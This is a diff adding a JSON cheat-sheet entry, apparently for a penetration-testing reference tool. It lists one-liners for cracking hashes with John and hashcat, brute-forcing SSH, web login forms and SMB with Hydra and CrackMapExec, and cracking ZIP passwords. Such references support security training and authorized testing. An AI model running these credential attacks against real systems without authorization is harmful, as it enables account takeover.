@@ -1,0 +1,12 @@
+{
+  "category": "Password Attacks",
+  "description": "John, hashcat & Hydra one-liners every junior uses",
+  "cheats": [
+    { "title": "John – fast crack rockyou", "content": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt" },
+    { "title": "Hashcat (mode 0 – MD5)", "content": "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force" },
+    { "title": "Hydra SSH", "content": "hydra -l user -P rockyou.txt ssh://<TARGET>" },
+    { "title": "Hydra HTTP-POST form", "content": "hydra -l admin -P rockyou.txt <TARGET> http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\"" },
+    { "title": "CrackMapExec SMB brute", "content": "cme smb <TARGET> -u users.txt -p rockyou.txt --no-bruteforce" },
+    { "title": "ZIP crack (fcrackzip)", "content": "fcrackzip -u -D -p rockyou.txt secret.zip" }
+  ]
+}
